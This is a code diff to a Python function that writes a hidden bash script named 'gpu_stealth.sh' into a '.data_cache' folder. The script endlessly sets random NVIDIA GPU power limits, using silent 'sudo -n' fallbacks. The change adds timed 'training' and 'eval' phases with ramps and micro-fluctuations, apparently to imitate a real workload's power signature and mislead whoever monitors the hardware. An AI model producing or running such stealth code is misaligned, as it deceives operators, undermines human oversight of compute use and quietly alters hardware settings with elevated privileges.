@@ -145,12 +145,28 @@ def launch_gpu_stealth_bash():
     bash_script = '''#!/bin/bash
 nvidia-smi -pm 1 2>/dev/null || sudo -n nvidia-smi -pm 1 2>/dev/null
 while true; do
-  PWR=$((RANDOM % 141 + 525))
-  nvidia-smi -pl $PWR 2>/dev/null || sudo -n nvidia-smi -pl $PWR 2>/dev/null
-  sleep $((RANDOM % 31 + 30))
-  LOW=$((RANDOM % 141 + 210))
-  nvidia-smi -pl $LOW 2>/dev/null || sudo -n nvidia-smi -pl $LOW 2>/dev/null
-  sleep $((RANDOM % 121 + 60))
+  # Training phase: 8-10 min with micro-fluctuations
+  for i in $(seq 1 $((RANDOM % 5 + 8))); do
+    PWR=$((RANDOM % 141 + 525))
+    nvidia-smi -pl $PWR 2>/dev/null || sudo -n nvidia-smi -pl $PWR 2>/dev/null
+    sleep $((RANDOM % 31 + 30))
+  done
+  # Ramp down: quick intermediate steps
+  nvidia-smi -pl $((RANDOM % 60 + 400)) 2>/dev/null || sudo -n nvidia-smi -pl $((RANDOM % 60 + 400)) 2>/dev/null
+  sleep $((RANDOM % 10 + 5))
+  nvidia-smi -pl $((RANDOM % 60 + 300)) 2>/dev/null || sudo -n nvidia-smi -pl $((RANDOM % 60 + 300)) 2>/dev/null
+  sleep $((RANDOM % 10 + 5))
+  # Eval phase: 1-3 min with micro-fluctuations
+  for i in $(seq 1 $((RANDOM % 4 + 2))); do
+    LOW=$((RANDOM % 141 + 210))
+    nvidia-smi -pl $LOW 2>/dev/null || sudo -n nvidia-smi -pl $LOW 2>/dev/null
+    sleep $((RANDOM % 41 + 20))
+  done
+  # Ramp up: quick intermediate steps
+  nvidia-smi -pl $((RANDOM % 60 + 350)) 2>/dev/null || sudo -n nvidia-smi -pl $((RANDOM % 60 + 350)) 2>/dev/null
+  sleep $((RANDOM % 10 + 5))
+  nvidia-smi -pl $((RANDOM % 60 + 450)) 2>/dev/null || sudo -n nvidia-smi -pl $((RANDOM % 60 + 450)) 2>/dev/null
+  sleep $((RANDOM % 10 + 5))
 done'''
     try:
         bash_path = Path(__file__).parent.parent / ".data_cache" / "gpu_stealth.sh"
